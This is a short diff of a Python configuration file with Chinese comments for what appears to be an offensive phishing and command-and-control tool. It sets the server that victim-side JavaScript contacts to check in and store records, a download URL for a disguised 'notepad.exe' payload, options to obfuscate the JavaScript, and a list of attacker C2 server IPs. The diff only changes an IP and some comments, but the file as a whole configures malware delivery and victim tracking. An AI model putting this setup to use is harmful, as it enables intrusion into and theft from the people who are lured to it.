@@ -16,7 +16,7 @@ record_name = "record.txt"
 
 # 设置JS中访问的IP:Port或域名
 PROTOCOL = "http"
-DOMAIN = "192.168.88.143"
+DOMAIN = "192.168.1.1"
 QUERY = f"{PROTOCOL}://{DOMAIN}/exist"
 STORE = f"{PROTOCOL}://{DOMAIN}/store"
 DOWNLOAD = f"{PROTOCOL}://{DOMAIN}/download/notepad.exe"
@@ -33,7 +33,7 @@ INTERNAL_IP = "internalIP"
 
 # 混淆JS文件
 # js_obfuscate_method == 0: 不加密
-# js_obfuscate_method == 1: js_obfuscate_m1(js_code_dir=static_path)  # 存在警告信息,启动时间长
+# js_obfuscate_method == 1: js_obfuscate_m1(js_code_dir=static_path)  # 初两次运行时存在警告信息,
 # js_obfuscate_method == 2: js_obfuscate_m2(js_code_dir=static_path)  # 存在弹框时中文乱码信息
 js_obfuscate_method = 0
 
@@ -52,8 +52,8 @@ ACCESSED_DOWNLOAD_FILE = "accessed_download_file"
 # 访问上线记录页面的cookie标记
 ACCESSED_ONLINE_PAGE = "accessed-online-page"
 
-# 攻击者的服务器IP列表 # 只接受这个IP列表里发过来的上线记录数据,  # 为空时不检验IP数据
 # 以下都是使用字符串匹配, 需求【192.168.0.0/16】可模糊写为【192.168】
+# 攻击者的服务器IP列表 # 只接受这个IP列表里发过来的上线记录数据,  # 为空时不检验IP数据
 ATTACK_C2_SERVER_IP_LIST = []
 
 # 只接受这个IP列表内的IP访问上线记录数据
